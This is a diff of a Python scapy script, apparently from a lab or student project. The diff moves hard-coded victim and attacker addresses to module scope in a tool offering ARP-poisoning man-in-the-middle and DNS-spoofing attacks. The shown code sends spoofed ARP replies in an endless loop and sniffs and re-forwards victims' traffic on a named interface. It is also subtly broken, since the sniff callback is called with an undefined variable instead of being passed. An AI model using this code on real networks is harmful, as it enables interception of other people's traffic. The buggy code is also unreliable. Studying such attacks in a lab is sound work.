@@ -5,6 +5,25 @@
 # Imports
 from scapy.all import *
 
+macVictimList = []
+ipVictimList = []
+
+# The MAC and IP addresses of the victims and the attacker are obtained
+# victims must be separated into two groups, servers and hosts
+#for i in range(nrOfHosts): 
+
+# Victim 1
+macVictimList.append("08:00:27:B7:C4:AF")
+ipVictimList.append("192.168.56.101")
+
+# Victim 2
+macVictimList.append("08:00:27:CC:08:6F")
+ipVictimList.append("192.168.56.102")
+
+# The attacker
+macAttacker = "08:00:27:D0:25:4B"
+# ipAttacker = input("The IP address of the attacker: ")
+
 # The main method to be ran by the user of our script
 def main():
     typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
@@ -26,26 +45,6 @@ def arppoison():
         print("The number of hosts you want to ARP poison: ")
         while (nrOfHosts < 2):
             nrOfHosts = input()
-
-    macVictimList = []
-    ipVictimList = []
-
-    # The MAC and IP addresses of the victims and the attacker are obtained
-    # victims must be separated into two groups, servers and hosts
-    #for i in range(nrOfHosts): 
-
-    # Victim 1
-    macVictimList.append("08:00:27:B7:C4:AF")
-    ipVictimList.append("192.168.56.101")
-
-    # Victim 2
-    macVictimList.append("08:00:27:CC:08:6F")
-    ipVictimList.append("192.168.56.102")
-
-    # The attacker
-    macAttacker = "08:00:27:D0:25:4B"
-    # ipAttacker = input("The IP address of the attacker: ")
-
 
     #for (i in nrOfHosts):
     #    arp
@@ -70,7 +69,7 @@ def arppoison():
         sendp(arp2, iface="enp0s3")
         
         # Call sniff to start sniffing for incoming packets from victims, and resend packets received via forward_packet
-        sniff(prn=forward_packet(packet, ipVictimList, macVictimList, macAttacker), iface = "enp0s3")
+        sniff(prn=forward_packet(packet), iface = "enp0s3")
 
         # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
         while(True):
@@ -85,7 +84,7 @@ def arppoison():
 
     
 # This method is used to forward the received packet we sniffed to the host it was intended to be sent to
-def forward_packet(packet, ipVictimList, macVictimList, macAttacker):
+def forward_packet(packet):
         if (packet[ARP].pdst == ipVictimList[1] and packet[Ether].dst == macAttacker):
             # Once we have the IP address of the destination, we must change the MAC address to what it should have been if it was not spoofed
             packet[Ether].dst = macVictimList[1]
